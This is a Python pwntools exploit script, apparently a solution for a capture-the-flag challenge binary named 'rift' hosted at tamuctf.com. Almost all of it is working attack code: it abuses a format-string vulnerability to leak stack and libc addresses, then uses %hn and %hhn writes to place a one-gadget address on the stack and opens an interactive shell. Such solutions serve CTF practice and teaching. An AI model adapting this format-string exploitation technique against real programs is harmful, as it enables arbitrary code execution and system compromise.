from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
	if local<2:
		gdb.attach(p,'''

			b* system
			c
			x/100gx $rsp
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./rift")
libc=ELF("./libc.so.6")
nc="nc ezae 14"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	#p=remote(host,port)
	p=remote("tamuctf.com", 443, ssl=True, sni="rift")
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass
def write_byte(char,offset,fort=True):  # byte to write and offset from rsp
	address=stack+offset
	if fort:
		n=address&0xffff
		p.sendline("%{}x%13$hn".format(n))
	else:
		n=address&0xff
		p.sendline("%{}x%13$hhn".format(n))
	p.recv(timeout=0.5)
	if char:
		p.sendline("%{}x%39$hhn".format(char))
	else:
		p.sendline("%39$hhn")		

def leak(offset):
	p.sendline("%{}$p".format(offset+6))
	leak=int(p.recvline()[:-1],16)
	return leak

def write(value,offset,l=6):
	for i in range(l):
		print(value&0xff)
		if (not i):
			write_byte((value&0xff),offset+i,True)
		else:
			write_byte((value&0xff),offset+i,False)
		value=value>>8





############### main exploit    ###############
stack=0
target=stack+0x38   # it points to stack+0x108 (2 bytes overwrite)
stack=leak(0)-0x100
target=stack+0x38
print("stack : ",hex(stack))
sure=leak(33)
assert ((stack&0xffffffffffff0000)==(sure&0xffffffffffff0000)) , "not aligned"

libc.address=leak(5)-0x2409b
print("libc : ",hex(libc.address))


write(libc.address+0x449d3,0x18)
#debug()
write(0,12,4)



p.interactive()